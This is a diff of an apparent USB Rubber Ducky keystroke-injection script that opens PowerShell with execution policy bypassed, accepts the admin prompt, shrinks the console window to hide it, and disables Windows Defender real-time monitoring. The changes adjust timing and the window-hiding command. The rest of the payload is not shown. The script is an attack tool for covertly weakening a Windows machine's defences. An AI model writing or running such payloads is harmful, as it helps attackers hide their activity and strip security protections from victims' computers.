@@ -5,15 +5,14 @@ GUI r
 DELAY 1200
 STRING powershell -nologo -noni -ep bypass
 CTRL-SHIFT ENTER
-DELAY 3000
+DELAY 2000
 LEFT
 DELAY 1000
 ENTER
-DELAY 2000
-STRING [console]::WindowHeight=1
+DELAY 1000
+STRING mode con:cols=100 lines=1
 ENTER
-STRING [console]::WindowWidth=1
-ENTER
+DELAY 500
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 1000
@@ -37,4 +36,3 @@ ENTER
 DELAY 1000
 STRING exit
 ENTER
-GUI d
